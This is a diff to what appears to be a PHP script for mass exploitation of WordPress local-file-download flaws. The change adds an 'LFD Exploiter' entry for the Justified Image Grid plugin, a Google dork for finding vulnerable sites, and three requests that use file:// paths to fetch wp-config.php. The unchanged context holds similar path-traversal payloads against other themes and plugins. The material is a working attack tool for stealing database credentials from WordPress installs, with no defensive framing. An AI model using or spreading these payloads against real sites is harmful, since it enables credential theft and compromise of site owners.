@@ -118,6 +118,11 @@
 # Vendor Homepage:: http://themeforest.net/item/cuckootap-one-page-parallax-wp-theme-plus-eshop/3512405
 # Google Dork:: wp-admin & inurl:revslider_show_image
 # ------------------------------------------------------------------------------
+# 
+# Wordpress plugin Justified Image Grid v2.0.1 LFD Exploiter 2015
+# Vendor Homepage:: http://codecanyon.net/item/justified-image-grid-premium-wordpress-gallery/2594251
+# Google Dork:: inurl:"/plugins/justified-image-grid"
+# ------------------------------------------------------------------------------
 # http://i.imgur.com/45BFlNe.png
 # ===============================================================================
 
@@ -206,6 +211,12 @@ __request($argv[1], '/wp-content/themes/lote27/download.php?download=../../../wp
 __request($argv[1], '/wp-content/themes/linenity/functions/download.php?imgurl=../../../../wp-config.php');
 
 __request($argv[1], '/wp-content/plugins/ajax-store-locator-wordpress_0/sl_file_download.php?download_file=../../../wp-config.php');
+
+__request($argv[1], '/wp-content/plugins/justified-image-grid/download.php?file=file:///C:/wamp/www/wp-config.php');
+
+__request($argv[1], '/wp-content/plugins/justified-image-grid/download.php?file=file:///C:/xampp/htdocs/wp-config.php');
+
+__request($argv[1], '/wp-content/plugins/justified-image-grid/download.php?file=file:///var/www/wp-config.php');
 
 function __request($url, $plugin) {
 
